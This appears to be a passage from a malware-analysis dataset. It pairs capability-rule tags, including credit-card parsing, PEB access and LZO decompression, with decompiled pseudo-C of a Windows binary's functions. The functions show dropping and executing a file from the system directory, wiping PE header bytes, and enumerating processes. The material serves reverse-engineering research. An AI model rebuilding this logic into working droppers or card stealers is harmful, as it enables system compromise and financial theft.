{
    "004010b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004010b0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4224bc == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004043e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4112e8, acStack1304, &uStack2112);\n    uStack2088 = 0x411370;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411388;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00405000(auStack1564, 0x4112e4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "004029c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402acc) overlaps instruction at (ram,0x00402acb)\n// \n// WARNING: Removing unreachable block (ram,0x00402a56)\n\nuint64_t __fastcall fcn.004029c0(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint extraout_EDX;\n    uint32_t *unaff_EBX;\n    uint32_t *puVar6;\n    uchar *puVar7;\n    int32_t *unaff_ESI;\n    uint32_t *puVar8;\n    uint32_t unaff_EDI;\n    int32_t *piVar9;\n    bool in_CF;\n    uint8_t in_AF;\n    bool bVar10;\n    uint8_t in_IF;\n    bool bVar11;\n    uint64_t uVar12;\n    \n    bVar11 = false;\n    puVar7 = &stack0xfffffffc;\n    if ((!in_CF) && (puVar7 = &stack0xfffffffc,  in_CF)) {\n        unaff_EBX = unaff_EBX + in_CF + *(unaff_EBX + param_2 * 4 + 0x69);\n        puVar7 = &stack0xfffffffc;\n    }\n    while( true ) {\n        ppiVar1 = *(puVar7 + 8);\n        if (*ppiVar1 != 0x5a4d) {\n            return param_2 << 0x20;\n        }\n        if ((*ppiVar1 < 0x5a4d) || (*ppiVar1 >= 0x5a4d)) break;\n        param_1 = param_1 + -1;\n        if (param_1 == 0 || *ppiVar1 != 0x5a4d) {\n            iVar2 = *unaff_ESI;\n            *ppiVar1 = unaff_ESI + 1;\n            piVar5 = iVar2 >> 0x1f;\n            goto code_r0x00402a0f;\n        }\n        uVar3 = in_EAX >> 8;\n        *(unaff_ESI + -0x7f) = *(unaff_ESI + -0x7f) | uVar3;\n        in_AF = 9 < (in_EAX & 0xf) | in_AF;\n        in_EAX = CONCAT11(uVar3 - in_AF, in_EAX + in_AF * -6) & 0xff0f;\n        puVar7 = puVar7 + -1;\n        param_2 = unaff_EDI;\n    }\n    piVar5 = ppiVar1[0xf] + ppiVar1;\ncode_r0x00402a0f:\n    if (*piVar5 != 0x4550) {\n        return ZEXT48(piVar5) << 0x20;\n    }\n    bVar10 = piVar5[0x16] == 0;\n    if (!bVar10) {\n        return ZEXT48(piVar5) << 0x20;\n    }\n    puVar8 = 0x40;\n    if ((!bVar10) && (bVar10)) {\n        bVar11 = ((in_IF & 1) * 0x200 >> 8 & 4) != 0;\n    }\n    if (ppiVar1[0xf] < 0x81) {\n        return ZEXT48(piVar5) << 0x20;\n    }\n    uVar12 = ZEXT48(piVar5) << 0x20;\n    piVar5 = ppiVar1[0xf];\n    if (piVar5 < 0xc0) {\n        puVar8 = piVar5 + -0x20;\n    }\n    if ((piVar5 < 0xc1) || (0xc0 < piVar5)) {\n        uVar12 = func_0x004050a6(puVar8);\n        piVar5 = uVar12;\n    }\n    bVar10 = (POPCOUNT(piVar5 & 0xff) & 1U) == 0;\n    *(puVar7 + -4) = piVar5;\n    if (piVar5 == NULL) {\n        return uVar12 & 0xfffffffff88b0000;\n    }\n    if ((bVar10) || (!bVar10)) {\n        unaff_EBX = NULL;\n    }\n    *unaff_EBX = *unaff_EBX ^ 0xffffffdb;\n    if (puVar8 != NULL) {\n        do {\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            piVar5 = *(puVar7 + -4);\n            puVar6 = unaff_EBX + 1;\n            *(unaff_EBX + piVar5) = iVar2 % 0xff;\n            unaff_EBX = puVar6;\n        } while (puVar6 < puVar8);\n    }\n    piVar9 = *(puVar7 + 8) + 0x80;\n    for (uVar4 = puVar8 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *piVar9 = *piVar5;\n        piVar5 = piVar5 + bVar11 * -2 + 1;\n        piVar9 = piVar9 + bVar11 * -2 + 1;\n    }\n    for (uVar4 = puVar8 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *piVar9 = *piVar5;\n        piVar5 = piVar5 + bVar11 * -2 + 1;\n        piVar9 = piVar9 + bVar11 * -2 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(*(puVar7 + -4));\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1333
    },
    "00401350": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004014cf) overlaps instruction at (ram,0x004014cd)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040181c)\n// WARNING: Removing unreachable block (ram,0x00401850)\n\nuint fcn.00401350(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    int16_t extraout_CX;\n    char *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint8_t uVar6;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_CH;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint32_t uVar5;\n    uint extraout_ECX_05;\n    uint16_t uVar7;\n    int32_t extraout_EDX;\n    int32_t *piVar8;\n    int32_t extraout_EDX_00;\n    uint8_t *extraout_EDX_01;\n    int32_t unaff_EBX;\n    uint8_t *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uchar *puVar16;\n    uint8_t **ppuVar17;\n    uint *unaff_EBP;\n    uint32_t uVar18;\n    char **unaff_EDI;\n    char **ppcVar19;\n    char **ppcVar20;\n    ushort in_SS;\n    ushort in_DS;\n    bool bVar21;\n    bool in_PF;\n    bool bVar22;\n    char cVar23;\n    uchar uVar24;\n    bool bVar25;\n    char cVar26;\n    unkbyte10 extraout_ST0;\n    unkbyte10 Var27;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 extraout_ST0_01;\n    ulong uVar28;\n    ulong uVar29;\n    unkbyte6 Var30;\n    \n    if ((!in_PF) && (in_PF)) {\n        puVar15 = &stack0xfffffff0;\n        cVar23 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar15 = puVar15 + -1;\n            *puVar15 = *unaff_EBP;\n            cVar23 = cVar23 + -1;\n        } while ('\\0' < cVar23);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    int.00401f30(0x411494, 0x11, 0x411028, 10);\n    int.00401f30(0x411494, 0x11, 0x411034, 0x12);\n    bVar21 = false;\n    uVar24 = 0;\n    int.00401f30(0x411494, 0x11, 0x411048, 4);\n    if ((!bVar21) && (bVar21)) {\n        piVar8 = unaff_EBX + 0x69 + extraout_EDX * 4;\n        iVar3 = unaff_EBX + *piVar8;\n        uVar24 = SCARRY4(unaff_EBX, *piVar8) != SCARRY4(iVar3, bVar21);\n        unaff_EBX = iVar3 + bVar21;\n    }\n    int.00401f30(0x411494, 0x11, 0x41104c, 0xc);\n    if ((!uVar24) && (uVar24)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    int.00401f30(0x411494, 0x11, 0x411058, 7);\n    int.00401f30(0x411494, 0x11, 0x411060, 0xb);\n    int.00401f30(0x411494, 0x11, 0x41106c, 0xc);\n    uVar28 = int.00401f30(0x411494, 0x11, 0x411078, 8);\n    Var27 = extraout_ST0;\n    while( true ) {\n        piVar8 = uVar28 >> 0x20;\n        *(uVar28 + -0x7ce92414) = Var27;\n        *piVar8 = *piVar8 + 0xd6adf84;\n        int.00401f30(0x411494, 0x11, 0x411080, unaff_EBX);\n        bVar21 = false;\n        bVar25 = false;\n        bVar22 = (extraout_CX - 1U & unaff_EDI | 0x61be) == 0;\n        uVar28 = int.00401f30(0x411494, 0x11, 0x411090, 0x18);\n        if ((bVar21 || bVar22) || (!bVar21 && !bVar22)) break;\n        if (!bVar25) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *extraout_ECX = *extraout_ECX + uVar28 + bVar21;\n        Var27 = extraout_ST0_00;\n    }\n    int.00401f30(0x411494, 0x11, 0x4110a8, 0x25);\n    cVar26 = '\\0';\n    cVar23 = '\\0';\n    uVar28 = int.00401f30(0x411494, 0x11, 0x4110d0, 10);\n    uVar18 = uVar28;\n    uVar5 = extraout_ECX_00;\n    if (cVar26 == cVar23) {\n        uVar5 = extraout_ECX_00 & 0xffff;\n    }\n    puVar10 = &stack0xffffffe0 ^ *(unaff_EBX + 0x6a);\n    puVar9 = (uVar28 >> 0x20) + 0x11;\n    uVar6 = uVar5 + 1 >> 8;\n    uVar24 = CARRY1(*puVar9, uVar6);\n    cVar26 = SCARRY1(*puVar9, uVar6);\n    *puVar9 = *puVar9 + uVar6;\n    cVar23 = *puVar9 < '\\0';\n    bVar21 = *puVar9 == 0;\n    puVar10[-1] = 0x411494;\n    puVar10[-2] = 0x401592;\n    int.00401f30(puVar10[-1], *puVar10, puVar10[1], puVar10[2]);\n    if (!bVar21 && cVar26 == cVar23) {\n        *(puVar10 + -6) = uVar28;\n        uVar18 = uVar18 & 0xffff0000 | *(puVar10 + -6);\n    }\n    puVar10[-2] = 0xd;\n    puVar10[-3] = 0x4110e8;\n    puVar10[-4] = 0x11;\n    puVar10[-5] = 0x411494;\n    puVar10[-6] = 0x4015b5;\n    int.00401f30(puVar10[-5], puVar10[-4], puVar10[-3], puVar10[-2]);\n    if (!uVar24 && !bVar21) {\n        puVar10[-6] = uVar18;\n        uVar18 = puVar10[-6];\n        if (uVar24 || bVar21) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar10[-6] = 6;\n    puVar10[-7] = 0x4110f8;\n    puVar10[-8] = 0x11;\n    puVar10[-9] = 0x411494;\n    puVar10[-10] = 0x4015d2;\n    uVar2 = int.00401f30(puVar10[-9], puVar10[-8], puVar10[-7], puVar10[-6]);\n    puVar10[6] = uVar2;\n    puVar10[6] = 5;\n    puVar10[5] = 0x411100;\n    puVar10[4] = 0x11;\n    puVar10[3] = 0x411494;\n    puVar10[2] = 0x4015ed;\n    uVar2 = int.00401f30(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    puVar10[6] = uVar2;\n    bVar21 = false;\n    bVar22 = (CONCAT11(((uVar2 >> 8) - unaff_EBX) + 'M', uVar2) & 0x26ae) == 1;\n    puVar10[6] = 0xd;\n    puVar10[5] = 0x411108;\n    puVar10[4] = 0x11;\n    puVar10[3] = 0x411494;\n    puVar10[2] = 0x40161b;\n    int.00401f30(puVar10[3], puVar10[4], puVar10[5], puVar10[6]);\n    puVar15 = puVar10 + 3;\n    if ((!bVar21 && !bVar22) && (puVar15 = puVar10 + 3,  bVar21 || bVar22)) {\n        puVar15 = puVar10 + 4;\n    }\n    puVar15[-1] = 0x19;\n    puVar15[-2] = 0x411118;\n    puVar15[-3] = 0x11;\n    puVar15[-4] = 0x411494;\n    puVar15[-5] = 4199999;\n    uVar2 = int.00401f30(puVar15[-4], puVar15[-3], puVar15[-2], puVar15[-1]);\n    puVar15[3] = uVar2;\n    bVar21 = false;\n    puVar15[3] = 0xf;\n    puVar15[2] = 0x411134;\n    puVar15[1] = 0x11;\n    *puVar15 = 0x411494;\n    puVar15[-1] = 0x40165a;\n    int.00401f30(*puVar15, puVar15[1], puVar15[2], puVar15[3]);\n    if ((!bVar21) && (puVar15[-1] = uVar18,  bVar21)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar15[-1] = 0xe;\n    puVar15[-2] = 0x411144;\n    puVar15[-3] = 0x11;\n    puVar15[-4] = 0x411494;\n    puVar15[-5] = 0x401685;\n    iVar3 = int.00401f30(puVar15[-4], puVar15[-3], puVar15[-2], puVar15[-1]);\n    puVar15[3] = iVar3;\n    bVar21 = iVar3 == extraout_ECX_01;\n    puVar15[3] = 0xb;\n    puVar15[2] = 0x411154;\n    puVar15[1] = 0x11;\n    *puVar15 = 0x411494;\n    puVar15[-1] = 0x4016a1;\n    int.00401f30(*puVar15, puVar15[1], puVar15[2], puVar15[3]);\n    if (bVar21) {\ncode_r0x004016bf:\n        puVar11 = puVar15 + -1;\n        puVar15[-1] = 0xb;\n    }\n    else {\n        puVar15[-1] = unaff_EDI;\n        ppcVar19 = puVar15[-1];\n        unaff_EDI = ppcVar19;\n        if (!bVar21) goto code_r0x004016bf;\n        unaff_EDI = ppcVar19 + 1;\n        pcVar4 = in(extraout_EDX_00);\n        *ppcVar19 = pcVar4;\n        puVar11 = puVar15 + -1;\n        puVar12 = puVar15 + -1;\n        if (puVar15 < 1) goto code_r0x00401729;\n    }\n    *(extraout_EDX_00 + 0xb) = *(extraout_EDX_00 + 0xb) ^ extraout_CH;\n    puVar11[-1] = 0x411160;\n    puVar11[-2] = 0x11;\n    puVar11[-3] = 0x411494;\n    puVar11[-4] = 0x4016d2;\n    uVar2 = int.00401f30(puVar11[-3], puVar11[-2], puVar11[-1], *puVar11);\n    puVar11[4] = uVar2;\n    puVar11[3] = unaff_EBX;\n    puVar11[2] = extraout_ECX_02;\n    uVar2 = puVar11[3];\n    puVar11[4] = 0xb;\n    puVar11[3] = 0x41116c;\n    puVar11[2] = 0x11;\n    puVar11[1] = 0x411494;\n    *puVar11 = 0x4016f1;\n    int.00401f30(puVar11[1], puVar11[2], puVar11[3], puVar11[4]);\n    puVar11[4] = extraout_ECX_03;\n    puVar11[4] = 10;\n    puVar11[3] = 0x411178;\n    puVar11[2] = 0x11;\n    puVar11[1] = 0x411494;\n    *puVar11 = 0x401712;\n    int.00401f30(puVar11[1], puVar11[2], puVar11[3], puVar11[4]);\n    puVar11[4] = uVar2;\n    unaff_EBX = puVar11[4];\n    puVar11[4] = 0xc;\n    puVar12 = puVar11 + 3;\n    puVar11[3] = 0x411184;\ncode_r0x00401729:\n    puVar12[-1] = 0x11;\n    puVar12[-2] = 0x411494;\n    puVar12[-3] = 0x401735;\n    int.00401f30(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = unaff_EBX;\n    uVar2 = puVar12[1];\n    puVar12[1] = 0xe;\n    *puVar12 = 0x411190;\n    puVar12[-1] = 0x11;\n    puVar12[-2] = 0x411494;\n    puVar12[-3] = 0x401761;\n    Var30 = int.00401f30(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = Var30;\n    cVar26 = '\\0';\n    cVar23 = ((CONCAT11(Var30 >> 8 & Var30 >> 0x28, Var30) * 2 | Var30 >> 0x20) ^ 0x6c00 ^ uVar2) < 0;\n    puVar12[1] = 0x11;\n    *puVar12 = 0x4111a0;\n    puVar12[-1] = 0x11;\n    puVar13 = puVar12 + -2;\n    puVar12[-2] = 0x411494;\n    puVar12[-3] = 0x40178c;\n    uVar28 = int.00401f30(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    piVar8 = uVar28 >> 0x20;\n    if ((cVar26 != cVar23) || (cVar26 == cVar23)) {\n        puVar13 = puVar12 + -3;\n        puVar12[-3] = 0x13;\n    }\n    *(uVar28 + -0x7ce92414) = extraout_ST0_01;\n    puVar13[-1] = uVar2;\n    *piVar8 = *piVar8 + 0x136adf84;\n    puVar13[-2] = 0x4111b4;\n    puVar13[-3] = 0x11;\n    puVar13[-4] = 0x411494;\n    puVar13[-5] = 0x4017b4;\n    int.00401f30(puVar13[-4], puVar13[-3], puVar13[-2], puVar13[-1]);\n    puVar13[3] = uVar2;\n    bVar21 = (uVar2 >> 8) + '0' < '\\0';\n    puVar9 = puVar13[3];\n    puVar13[3] = 0x14;\n    puVar13[2] = 0x4111c8;\n    puVar13[1] = 0x11;\n    *puVar13 = 0x411494;\n    puVar13[-1] = 0x4017d7;\n    uVar28 = int.00401f30(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    if ((bVar21) || (!bVar21)) {\n        puVar14 = puVar13 + -1;\n        puVar13 = puVar13 + -1;\n        *puVar14 = 0x33;\n    }\n    *puVar9 = *puVar9 & 0xc3;\n    piVar8 = (uVar28 >> 0x20) + 0x33;\n    cVar26 = SBORROW4(*piVar8, unaff_EBP);\n    cVar23 = *piVar8 - unaff_EBP < 0;\n    puVar13[-1] = 0x4111dc;\n    puVar13[-2] = 0x11;\n    puVar13[-3] = 0x411494;\n    puVar13[-4] = 0x4017fa;\n    uVar29 = int.00401f30(puVar13[-3], puVar13[-2], puVar13[-1], *puVar13);\n    pcVar4 = uVar29;\n    puVar15 = puVar13 + -3;\n    ppcVar19 = unaff_EDI;\n    if (cVar26 == cVar23) {\n        *(puVar13 + -0xe) = uVar29 >> 0x20;\n        uVar7 = *(puVar13 + -0xe);\n        puVar15 = puVar13 + -3;\n        if (cVar26 != cVar23) {\n            out(0xc4, pcVar4);\n            *(puVar13 + -4) = in_DS;\n            *(puVar13 + -5) = in_SS;\n            ppcVar19 = unaff_EDI + 1;\n            *unaff_EDI = pcVar4;\n            puVar15 = puVar13 + -6;\n            puVar13[-6] = uVar29 >> 0x20 & 0xffff0000 | uVar7 & 0xffffff00 | uVar7 ^ extraout_CL;\n            cVar23 = puVar9 >> 8;\n            cVar26 = SBORROW1(cVar23, *pcVar4);\n            cVar23 = cVar23 - *pcVar4 < '\\0';\n        }\n    }\n    *(puVar15 + -4) = 10;\n    *(puVar15 + -8) = 0x411210;\n    *(puVar15 + -0xc) = 0x11;\n    *(puVar15 + -0x10) = 0x411494;\n    *(puVar15 + -0x14) = 0x40182e;\n    uVar29 = int.00401f30(*(puVar15 + -0x10), *(puVar15 + -0xc), *(puVar15 + -8), *(puVar15 + -4));\n    puVar16 = puVar15 + -0x10;\n    ppcVar20 = ppcVar19;\n    if (cVar26 == cVar23) {\n        *(puVar15 + -0x12) = uVar29 >> 0x20;\n        uVar7 = *(puVar15 + -0x12);\n        puVar16 = puVar15 + -0x10;\n        if (cVar26 != cVar23) {\n            out(0xc4, uVar29);\n            *(puVar15 + -0x14) = in_DS;\n            *(puVar15 + -0x18) = in_SS;\n            ppcVar20 = ppcVar19 + 1;\n            *ppcVar19 = uVar29;\n            puVar16 = puVar15 + -0x1c;\n            *(puVar15 + -0x1c) = uVar29 >> 0x20 & 0xffff0000 | uVar7 & 0xffffff00 | uVar7 ^ extraout_CL_00;\n        }\n    }\n    *(puVar16 + -4) = 4;\n    *(puVar16 + -8) = 0x41121c;\n    *(puVar16 + -0xc) = 0x11;\n    *(puVar16 + -0x10) = 0x411494;\n    *(puVar16 + -0x14) = 0x401862;\n    int.00401f30(*(puVar16 + -0x10), *(puVar16 + -0xc), *(puVar16 + -8), *(puVar16 + -4));\n    uVar5 = extraout_ECX_04;\n    if ((puVar16 + 0x30 < 0) || (uVar5 = extraout_ECX_04 & 0xffff,  puVar16 + 0x30 >= 0)) {\n        *(puVar16 + 0x2c) = 5;\n        *(puVar16 + 0x28) = 0x411220;\n        *(puVar16 + 0x24) = 0x11;\n        puVar16 = puVar16 + -0xc;\n    }\n    *extraout_EDX_01 = *extraout_EDX_01 & extraout_EDX_01;\n    puVar1 = extraout_EDX_01 + 0x11;\n    uVar6 = uVar5 + 1 >> 8;\n    bVar21 = CARRY1(*puVar1, uVar6);\n    *puVar1 = *puVar1 + uVar6;\n    bVar22 = *puVar1 == 0;\n    *(puVar16 + 0x2c) = 0x411494;\n    *(puVar16 + 0x28) = 0x40188d;\n    int.00401f30(*(puVar16 + 0x2c), *(puVar16 + 0x30), *(puVar16 + 0x34), *(puVar16 + 0x38));\n    ppuVar17 = puVar16 + 0x2c;\n    if ((!bVar21 && !bVar22) && (ppuVar17 = puVar16 + 0x2c,  bVar21 || bVar22)) {\n        ppuVar17 = puVar16 + 0x30;\n    }\n    ppuVar17[-1] = 0x6;\n    ppuVar17[-2] = 0x411228;\n    ppuVar17[-3] = 0x11;\n    ppuVar17[-4] = 0x411494;\n    ppuVar17[-5] = 0x4018b1;\n    uVar29 = int.00401f30(ppuVar17[-4], ppuVar17[-3], ppuVar17[-2], ppuVar17[-1]);\n    ppuVar17[3] = uVar29;\n    ppuVar17[2] = extraout_ECX_05;\n    ppuVar17[1] = uVar29 >> 0x20;\n    *ppuVar17 = puVar9;\n    ppuVar17[-1] = ppuVar17 + 4;\n    ppuVar17[-2] = unaff_EBP;\n    ppuVar17[-3] = uVar28 + -0x1bf31dd6;\n    ppuVar17[-4] = ppcVar20;\n    ppuVar17[3] = 0x2a;\n    ppuVar17[2] = 0x41125c;\n    ppuVar17[1] = 0x11;\n    *ppuVar17 = 0x411494;\n    ppuVar17[-1] = 0x4018d6;\n    uVar2 = int.00401f30(*ppuVar17, ppuVar17[1], ppuVar17[2], ppuVar17[3]);\n    ppuVar17[3] = uVar2;\n    ppuVar17[3] = 0xb;\n    ppuVar17[2] = 0x411288;\n    ppuVar17[1] = 0x11;\n    *ppuVar17 = 0x411494;\n    ppuVar17[-1] = 0x4018f7;\n    uVar2 = int.00401f30(*ppuVar17, ppuVar17[1], ppuVar17[2], ppuVar17[3]);\n    return uVar2;\n}\n",
        "token_count": 5957
    },
    "004031e0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004031e0(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    var_8h = (**0x4224e4)();\n    if (var_8h == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar5 = &var_12ch;\n    for (iVar4 = 0x49; iVar3 = var_8h,  iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x4224e8)(var_8h, &var_130h);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = hObject;\n    while( true ) {\n        hObject = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n        iVar4 = (*pcVar2)(&var_10ch, arg_8h);\n        if (iVar4 == 0) break;\n        iVar4 = (**0x4224ec)(iVar3, &var_130h);\n        uVar1 = hObject;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    return var_128h;\n}\n",
        "token_count": 407
    },
    "00401fb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020c3) overlaps instruction at (ram,0x004020c1)\n// \n// WARNING: Removing unreachable block (ram,0x00402035)\n\nulong fcn.00401fb0(uint param_1, uint32_t param_2, uint *param_3, int32_t *param_4)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *unaff_EDI;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = param_3;\n        return CONCAT44(param_1, param_3);\n    }\n    uVar3 = fcn.00403480(0, param_1, param_2 + 1 >> 1);\n    iVar4 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar7 = *(iVar4 + 0x58);\n    puVar1 = uVar3 + 0x3b;\n    *puVar1 = *puVar1 & 0xfffffff2;\n    iVar6 = uVar3 - (uVar7 & 0xffff);\n    puVar5 = uVar7 >> 0x10;\n    if (iVar6 < uVar7 >> 0x10) {\n        uVar7 = (iVar6 - 